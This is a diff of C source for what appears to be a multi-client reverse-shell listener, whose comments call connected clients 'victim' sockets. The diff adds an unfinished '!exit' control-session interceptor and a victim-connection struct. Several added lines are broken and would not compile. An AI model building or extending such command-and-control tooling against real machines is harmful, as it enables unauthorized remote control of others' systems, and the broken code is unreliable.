@@ -28,8 +28,12 @@ typedef struct args
 	int dest;
 } args;
 
-// Declaration of a thread routine that will be called by pthread for reading from stdin on server and write to the victim file descriptor
+typedef struct victim_connection {
+    int dest;  // File descriptor for client-socket
+    char* address;  // IP Address of victim, use `inet_ntoa(cli.sin_addr)` to properly use
+} v_conn;
 
+// Declaration of a thread routine that will be called by pthread for reading from stdin on server and write to the victim file descriptor
 void *Acceptor(void *arg){
 
 	// assigned master socket to the set
@@ -46,28 +50,25 @@ void *Acceptor(void *arg){
 		FD_SET(master_socket, &readfds);
 		max_sd = master_socket;
 
-		//add child sockets to set
+		// add child sockets to set
 		for ( i = 0 ; i < max_clients ; i++){
-			//socket descriptor
+			// socket descriptor
 			sd = client_socket[i];
 
-			//if valid socket descriptor then add to read list
+			// if valid socket descriptor then add to read list
 			if(sd > 0)
 				FD_SET( sd , &readfds);
 
-			//highest file descriptor number, need it for the select function
+			// highest file descriptor number, need it for the select function
 			if(sd > max_sd)
 				max_sd = sd;	  
 		}
 
-
-		//wait for an activity on one of the sockets , timeout is NULL , so wait indefinitely
-		activity = select( max_sd + 1 , &readfds , NULL , NULL , NULL);
+		// wait for an activity on one of the sockets , timeout is NULL , so wait indefinitely
+		activity = select( max_sd + 1, &readfds, NULL, NULL, NULL);
 
 		if ((activity < 0) && (errno!=EINTR)) {
-
 			;;
-
 		}
 
 		if (FD_ISSET(master_socket, &readfds)) {
@@ -78,9 +79,7 @@ void *Acceptor(void *arg){
 			activity = select( max_sd + 1 , &readfds , NULL , NULL , NULL);
 
 			if ((activity < 0) && (errno!=EINTR)) {
-
-				;;	
-
+				;;
 			}
 
 			if (FD_ISSET(master_socket, &readfds)) {
@@ -110,6 +109,13 @@ void *Acceptor(void *arg){
 	}
 }
 
+int server_control_session(args *a) {
+	char buffer[MAXBUF];
+
+	while(n){
+		
+	}
+}
 
 void *Writer(void *arg)
 {
@@ -119,9 +125,16 @@ void *Writer(void *arg)
 	char buffer[MAXBUF];
 
 	while ((n = read(a.src, buffer, MAXBUF - 1)) > 0) // reads from the stdin file descriptor and executes code if it's contents are above 0. a.src is passed the stdin fd on line 122
-	{	
-		write(a.dest, buffer, n); // writes to victim file descriptor. clientfd is passed to a.dest on line 123
-	}
+    {
+	// INTERCEPTOR
+        if (strcmp(buffer, "!exit") == 0) {
+            	// a.dest = NULL; // TODO CHANGE
+            	a.dest = server_control_session(a);  // pause writing from connections and enter sever control session
+		continue;
+        } else {
+            write(a.dest, buffer, n); // writes to victim file descriptor. clientfd is passed to a.dest on line 123
+        }
+    }
 
 	if (n == -1)
 	{
@@ -195,28 +208,24 @@ int CreateServerSocket(char *address, char *port, int *type, int *family)
 	return sockfd;
 }
 
-void connection_display(args *a) {
-    n = read(a.dest, buffer, MAXBUF);
-    write(STDOUT_FILENO, buffer, n);
-    while ((n = read(a.dest, buffer, MAXBUF)) > 0)
-    {
+void connection_display(args *a, char *buffer) {
+	int n;
 
-        if (write(STDOUT_FILENO, buffer, n) == -1)  // writes data from victim fd to stdout
-        {
-            printf("Error in function write()\n");
-        }
-    }
+	n = read(a->dest, buffer,MAXBUF);
+	write(STDOUT_FILENO, buffer, n);
+	while ((n = read(a->dest, buffer, MAXBUF)) > 0) {
+        	if (write(STDOUT_FILENO, buffer, n) == -1)  // writes data from victim fd to stdout
+            	printf("Error in function write()\n");
+	}
 
-    if (n == -1)
-    {
-        printf("Error in function read()\n");
-    }
+	if (n == -1) {
+        	printf("Error in function read()\n");
+	}
 }
 
 void Server(char *address, char *port, int *type, int *family)
 {
 	args a;
-	int n;
 	char buffer[MAXBUF];
 	pthread_t printer;
 	pthread_t acceptor;
@@ -225,7 +234,6 @@ void Server(char *address, char *port, int *type, int *family)
 	master_socket = CreateServerSocket(address, port, type, family);
 
 	// create an acceptor child process to accept incoming connections
-
 	if (pthread_create(&acceptor, NULL, Acceptor, (void *)&a) != 0)
 	{
 		printf("Error in function pthread_create\n");
@@ -247,7 +255,7 @@ void Server(char *address, char *port, int *type, int *family)
 	}
 
 	// reads data from the victim socket, executes code is data is found
-    connection_display(&a)
+    	connection_display(&a, **buffer);
 
 	// sends a request to stop thread
 	pthread_cancel(printer);
